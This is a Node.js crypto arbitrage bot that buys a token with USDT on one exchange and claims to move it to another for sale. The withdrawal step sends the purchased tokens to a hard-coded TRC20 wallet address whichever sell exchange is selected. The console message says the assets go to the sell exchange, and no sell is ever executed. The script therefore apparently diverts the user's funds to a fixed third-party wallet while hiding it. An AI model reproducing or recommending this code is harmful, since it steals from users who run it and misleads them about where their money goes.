const exchange = require("./libs/exchange.js");
const coinsName = require("./libs/coins.js");
const readline = require('readline-sync');
const MaxFdata = 30;
const MarginProcentageMIN = 0.2;

/**
 * Fetch data and select a trading pair.
 */
async function fetchAndSelectData(FetchDataCount, autoMode = false) {
    let data = await exchange.getExchange(FetchDataCount);
    if (autoMode) {
        return { data, dataIndex: 0 }; // Use the first entry in auto mode
    } 

    // Add an index starting from 1
    let indexedData = data.map((item, index) => ({ data_no: index + 1, ...item }));
    console.table(indexedData, ['data_no', ...Object.keys(data[0])]);

    let dataIndex;
    do {
        dataIndex = readline.question(`Enter data_no to use (1 to ${FetchDataCount}): `).trim();
    } while (isNaN(dataIndex) || dataIndex < 1 || dataIndex > FetchDataCount);

    return { data, dataIndex: dataIndex - 1 }; // Convert to zero-based index
}

/**
 * Execute arbitrage trading.
 */
async function executeArbitrage(data, dataIndex, TradingAmount) {
    let pair = data[dataIndex]['coin'].replace("+", "");
    let coins = coinsName.getCoinName(pair);
    let fromToken = coins[0];
    let toToken = coins[1];

    if (toToken !== "USDT") {
        console.log("Trading can only start with USDT on the right side!");
        return;
    }

    let buy_exchange = data[dataIndex]['buy_exchange'].replace("Huobi", "htx").toLowerCase();
    let sell_exchange = data[dataIndex]['sell_exchange'].replace("Huobi", "htx").toLowerCase();
    let buy_price = data[dataIndex]['buy_price'];
    let sell_price = data[dataIndex]['sell_price'];
    let profit = data[dataIndex]['profit'];
    let MarginThreshold = MarginProcentageMIN * parseFloat(TradingAmount);

    console.log("Trading opportunity:");
    console.log(` - Trading pair: ${pair}, (BUY) ${buy_exchange.toUpperCase()} -> (SELL) ${sell_exchange.toUpperCase()}, AMOUNT: ${TradingAmount} ${toToken}`);

    try {
        const buy_function = require(`./exchange/${buy_exchange}.js`);
        const sell_function = require(`./exchange/${sell_exchange}.js`);

        let get_buy_exchange = await buy_function.getExchangeRate(fromToken, toToken);
        let get_sell_exchange = await sell_function.getExchangeRate(fromToken, toToken);

        let fromTokenOut = get_buy_exchange.reverse_price * TradingAmount;
        let toTokenOut = get_sell_exchange.price * fromTokenOut;
        let tradingMargin = toTokenOut - TradingAmount;

        console.log(` - Buy ${fromToken} using ${TradingAmount} ${toToken} get ${fromTokenOut} ${fromToken}`);
        console.log(` - Sell ${fromTokenOut} ${fromToken} and get ${toTokenOut} ${toToken}`);

        if (tradingMargin > MarginThreshold) {
            console.log(` - Potential trading profit: ${tradingMargin} ${toToken}, margin threshold ${MarginThreshold} ${toToken}`);
            console.log("\nExecuting trading...");

            let buy_response = await buy_function.swapTokens(fromToken, toToken, 'BUY', TradingAmount);
            if (buy_response.code >= 1) {
                console.log(" - Buy action success! Moving asset to: " + sell_exchange);
                console.log(" - Start moving procedure, please wait!");

                let withdraw_response = await buy_function.withdrawToken(fromToken, fromTokenOut, 'TXKrW8JQCfAAyDUq8YmzcaivRatLUYkmk4', 'TRC20');
                console.log(" - Withdraw response:", withdraw_response);
            } else {
                console.log(" - Buy assets error, reason: " + buy_response.msg);
            }
        } else {
            console.log(" - No profitable arbitrage, exiting!");
        }
    } catch (error) {
        console.error(`Error during trading execution: ${error.message || error}`);
    }
}

/**
 * Main function to start arbitrage trading.
 */
async function startArbitrageTrading(TradingAmount) {
    console.clear();
    const args = process.argv.slice(2);
    const autoMode = args.includes("auto");

    let FetchDataCount;
    if (autoMode) {
        FetchDataCount = 1;
    } else {
        do {
            FetchDataCount = readline.question(`Enter the amount of data (MAX ${MaxFdata}): `).trim();
        } while (isNaN(FetchDataCount) || FetchDataCount < 1 || FetchDataCount > MaxFdata);
    }

    const start = process.hrtime();
    try {
        const { data, dataIndex } = await fetchAndSelectData(FetchDataCount, autoMode);
        await executeArbitrage(data, dataIndex, TradingAmount);
    } catch (error) {
        console.error(`General error: ${error.message || error}`);
    }

    // Log execution time
    const end = process.hrtime(start);
    let seconds = end[0] + end[1] / 1e9;
    console.table([
        { Label: "Start Time", Value: start[1] },
        { Label: "End Time", Value: end[1] },
        { Label: "Execution Time (s)", Value: seconds },
    ]);
}

// Start the arbitrage trading with a trading amount of 10 USDT
startArbitrageTrading("10");